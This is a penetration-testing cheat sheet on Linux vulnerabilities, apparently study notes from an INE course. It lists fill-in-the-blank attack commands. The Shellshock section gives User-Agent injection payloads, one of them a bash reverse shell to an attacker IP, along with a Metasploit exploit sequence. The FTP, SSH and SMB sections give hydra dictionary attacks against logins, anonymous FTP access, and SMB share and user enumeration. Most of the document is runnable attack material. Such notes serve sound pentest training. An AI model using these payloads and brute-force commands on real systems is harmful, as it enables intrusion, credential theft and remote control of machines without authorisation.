# Linux Vulnerabilities

* [Frequently Exploited Linux Services](#frequently-exploited-linux-services)
* [Shellshock](#shellshock)
* [FTP](#ftp)
* [SSH](#ssh)
* [SAMBA](#samba)
* [References](#references)

***********************************************************************
Items inside [SQUARE-BRACKETS] indicate changeable (fill in the blank) fields.  
Note: Bracket characters themselves [ ] require removal. See examples.
***********************************************************************

## Frequently Exploited Linux Services

* Apache Web Server -- TCP ports 80/443
* SSH -- TCP port 22
* FTP -- TCP port 21
* SAMBA -- TCP port 445

**************************************

## Shellshock

* CVE-2014-6271
* Bash
* Allows attacker to execute remote arbitrary commands via Bash
* Need to locate an input vector or script that allows you to communicate with Bash first
* Uses Common Gateway Interface (CGI) Scripts

### nmap
Check for Shellshock vulnerability:
```
nmap -sV [TARGET-IP] --script=http-shellshock --script-args "http-shellshock.uri=/[CGI-PATH]
```

### Burp Suite

* Use Burp Suite (or other attack proxy) to capture request of the .cgi location on the web server.
* Send it to the repeater.
* replace "User-Agent" with:
```
() { :; }; echo; echo; /bin/bash -c '[COMMAND-TO-EXECUTE]'
```
* and send it to the web server.
* The response should give you the output of the command specified 
* use this command to get a reverse shell (set up a listener before running it):
```
() { :; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/[ATTACK-IP]/[LISTENER-PORT] 0>&1'
```

### Metasploit

```
search Shellshock
```
```
use exploit/multi/http/apache_mod_cgi_bash_env_exec
```
```
set RHOSTS [TARGET-IP]
```
```
set TARGETURI [CGI-PATH]
```
and any other options (may need to change port for example)
```
exploit
```

**************************************

## FTP

Check for anonymous access:
```
ftp [TARGET-IP]
```
Username:
```
anonymous
```
Password:
```
```
Another way:  
nmap --script ftp-anon.nse

Download file:
```
get [FILE]
```

Login:
```
ftp [TARGET-IP]
```

### hydra

Dictionary Attack:
```
hydra -L [USERS-WORDLIST] -P [PASSWORD-WORDLIST] [TARGET-IP] ftp
```

**************************************

## SSH

### hydra

Dictionary attack:
```
hydra -L [USERNAME-WORDLIST] -P [PASSWORD-WORDLIST] [TARGET-IP] ssh
```
* -t [NUMBER] to change speed of attack


**************************************

## SAMBA

### hydra

Dictionary attack:
```
hydra -l [USERNAME] -P [PASSWORD-WORDLIST] [TARGET-IP] smb
```

### smbmap

Display shares:
```
smbmap -H [TARGET-IP] -u [USERNAME] -p [PASSWORD]
```

### smbclient

Display shares and workgroup:
```
smbclient -L 192.113.234.3 -U admin
```
* Then enter password when prompted.

Log into share:
```
smbclient //[TARGET-IP]/[SHARE] -U [USERNAME]
```

Download file:
```
get [FILE]
```

### enum4linux

Get information on target:
```
enum4linux -a [TARGET-IP]
```
Use credentials to get more information:
```
enum4linux -a -u [USERNAME] -p [PASSWORD] [TARGET-IP]
```

**************************************

### References
Penetration Tester Student v2 by INE  
https://my.ine.com/CyberSecurity/learning-paths/61f88d91-79ff-4d8f-af68-873883dbbd8c/penetration-testing-student-v2